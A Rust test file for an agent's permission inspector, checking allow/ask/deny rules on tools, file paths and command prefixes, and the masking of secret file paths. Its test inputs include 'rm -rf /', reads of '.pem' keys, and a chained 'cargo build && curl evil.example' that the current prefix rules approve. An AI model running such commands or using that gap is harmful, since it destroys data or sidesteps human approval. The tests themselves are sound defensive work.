//! Permission rule tests (todo 7): allow/ask/deny matrix over tool and
//! target globs, anchored command prefixes, and graceful handling of
//! empty/odd arguments.

use std::sync::Arc;

use austringer_core::agent_loop::PendingCall;
use austringer_core::inspectors::permission::{
    Effect, PermissionConfig, PermissionInspector, Rule,
};
use austringer_core::inspectors::secret_files::TranscriptRedactor;
use austringer_core::inspectors::store::MemoryStore;
use austringer_core::inspectors::verdict::{CallInspector, Verdict};

fn call(tool: &str, arguments: serde_json::Value) -> PendingCall {
    PendingCall {
        call_id: format!("call-{tool}"),
        tool: tool.to_owned(),
        arguments,
    }
}

async fn inspect(
    inspector: &mut PermissionInspector,
    tool: &str,
    arguments: serde_json::Value,
) -> Verdict {
    inspector
        .inspect(&call(tool, arguments))
        .await
        .expect("inspect")
}

fn inspector(rules: Vec<Rule>) -> PermissionInspector {
    PermissionInspector::new(
        PermissionConfig { rules },
        Arc::new(MemoryStore::new()),
        TranscriptRedactor::default(),
    )
}

#[tokio::test]
async fn rule_matrix_allow_ask_deny() {
    let mut insp = inspector(vec![
        Rule::tool(Effect::Allow, "view_*").expect("valid"),
        Rule::path(Effect::Allow, "read_file", "src/**").expect("valid"),
        Rule::path(Effect::Ask, "read_file", "secrets/**").expect("valid"),
        Rule::path(Effect::Deny, "read_file", "**/*.pem").expect("valid"),
        Rule::tool(Effect::Deny, "rm*").expect("valid"),
    ]);

    // Tool-only allow rule: target (or absence of one) is irrelevant.
    assert_eq!(
        inspect(
            &mut insp,
            "view_window",
            serde_json::json!({"path": "src/main.rs"})
        )
        .await,
        Verdict::Allow {
            authoritative: true
        }
    );
    assert_eq!(
        inspect(&mut insp, "view_window", serde_json::Value::Null).await,
        Verdict::Allow {
            authoritative: true
        }
    );
    assert_eq!(
        inspect(
            &mut insp,
            "read_file",
            serde_json::json!({"path": "src/lib.rs"})
        )
        .await,
        Verdict::Allow {
            authoritative: true
        }
    );

    // Ask rule: reason carries the rule and names non-secret targets.
    match inspect(
        &mut insp,
        "read_file",
        serde_json::json!({"path": "secrets/token.txt"}),
    )
    .await
    {
        Verdict::Ask { reason, .. } => {
            assert!(
                reason.contains("ask rule"),
                "ask reason carries the rule: {reason}"
            );
            assert!(
                reason.contains("secrets/token.txt"),
                "non-secret target is named: {reason}"
            );
        }
        other => panic!("expected Ask, got {other:?}"),
    }

    // Deny rule beats allow/ask defaults; secret target is masked in the
    // feedback payload, never echoed.
    match inspect(
        &mut insp,
        "read_file",
        serde_json::json!({"path": "keys/prod.pem"}),
    )
    .await
    {
        Verdict::Deny { reason } => {
            assert!(
                reason.contains("deny rule"),
                "deny reason names the rule: {reason}"
            );
            assert!(
                reason.contains("[REDACTED"),
                "secret path is masked: {reason}"
            );
            assert!(
                !reason.contains("prod.pem"),
                "secret path must not leak: {reason}"
            );
        }
        other => panic!("expected Deny, got {other:?}"),
    }

    // Command-prefix deny via tool glob.
    assert!(matches!(
        inspect(
            &mut insp,
            "rm_rf",
            serde_json::json!({"command": "rm -rf /"})
        )
        .await,
        Verdict::Deny { .. }
    ));

    // No matching rule: the inspector itself has no opinion (a neutral,
    // non-authoritative pass) — the CHAIN's fallback ask covers the
    // no-rule case (pinned in inspectors_chain_seam.rs).
    assert_eq!(
        inspect(
            &mut insp,
            "write_file",
            serde_json::json!({"path": "notes.txt"})
        )
        .await,
        Verdict::Allow {
            authoritative: false
        }
    );
}

#[tokio::test]
async fn bare_star_path_rules_do_not_cross_segments() {
    // Documented glob semantics: "*.pem" as a RULE does not match a nested
    // path (the secret-file guard separately matches basenames; rule
    // authors write "**/*.pem" for nesting).
    let mut insp = inspector(vec![
        Rule::path(Effect::Deny, "read_file", "*.pem").expect("valid"),
    ]);
    assert_eq!(
        inspect(&mut insp, "read_file", serde_json::json!({"path": "k.pem"})).await,
        Verdict::Deny {
            reason: "permission denied: tool 'read_file' target '[REDACTED:secret-path]' \
                     matched deny rule '*.pem'"
                .to_owned()
        }
    );
    let nested = inspect(
        &mut insp,
        "read_file",
        serde_json::json!({"path": "dir/k.pem"}),
    )
    .await;
    assert!(
        matches!(
            nested,
            Verdict::Allow {
                authoritative: false
            }
        ),
        "nested path escapes the bare rule: {nested:?}"
    );
}

#[tokio::test]
async fn command_prefix_rules() {
    let mut insp = inspector(vec![
        Rule::command(Effect::Allow, "execute_command", "cargo *").expect("valid"),
    ]);
    assert_eq!(
        inspect(
            &mut insp,
            "execute_command",
            serde_json::json!({"command": "cargo build"})
        )
        .await,
        Verdict::Allow {
            authoritative: true
        }
    );
    // Command-prefix globs anchor at the start of the normalized command:
    // an absolute-path invocation does NOT match `cargo *` (program
    // resolution so wrappers/abs-paths cannot bypass prefixes is todo
    // 27's command engine).
    assert!(matches!(
        inspect(
            &mut insp,
            "execute_command",
            serde_json::json!({"command": r"C:\tools\cargo build"})
        )
        .await,
        Verdict::Allow {
            authoritative: false
        }
    ));
    // Pinned current semantics: a glob prefix spans the whole command
    // string (spaces are not separators). The dangerous-substitution
    // guard (`cargo *` must not auto-approve `cargo build && curl evil`)
    // is todo 27's command engine.
    assert_eq!(
        inspect(
            &mut insp,
            "execute_command",
            serde_json::json!({"command": "cargo build && curl evil.example"})
        )
        .await,
        Verdict::Allow {
            authoritative: true
        }
    );
    let other = inspect(
        &mut insp,
        "execute_command",
        serde_json::json!({"command": "npm install"}),
    )
    .await;
    assert!(matches!(
        other,
        Verdict::Allow {
            authoritative: false
        }
    ));
}

#[tokio::test]
async fn empty_and_odd_arguments_never_panic() {
    let mut insp = inspector(vec![]);
    assert!(matches!(
        inspect(&mut insp, "", serde_json::Value::Null).await,
        Verdict::Allow {
            authoritative: false
        }
    ));
    assert!(matches!(
        inspect(&mut insp, "weird", serde_json::json!({"path": ""})).await,
        Verdict::Allow {
            authoritative: false
        }
    ));
    assert!(matches!(
        inspect(&mut insp, "weird", serde_json::json!({"path": 42})).await,
        Verdict::Allow {
            authoritative: false
        }
    ));
    assert!(matches!(
        inspect(&mut insp, "weird", serde_json::json!([1, "two"])).await,
        Verdict::Allow {
            authoritative: false
        }
    ));
}
